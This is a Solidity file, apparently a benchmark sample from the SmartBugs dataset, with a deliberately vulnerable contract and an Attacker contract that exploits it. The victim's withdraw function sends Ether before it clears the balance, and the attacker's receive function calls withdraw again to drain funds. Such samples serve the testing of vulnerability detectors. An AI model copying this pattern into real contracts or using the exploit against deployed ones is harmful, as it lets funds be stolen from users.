// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Simple Reentrancy Example
 * @notice Classic reentrancy vulnerability for testing
 * @dev Source: SmartBugs dataset
 */
contract ReentrancySimple {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}

/**
 * @title Attacker contract
 */
contract Attacker {
    ReentrancySimple public victim;
    uint256 public attackCount;

    constructor(address _victim) {
        victim = ReentrancySimple(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether && attackCount < 3) {
            attackCount++;
            victim.withdraw();
        }
    }
}
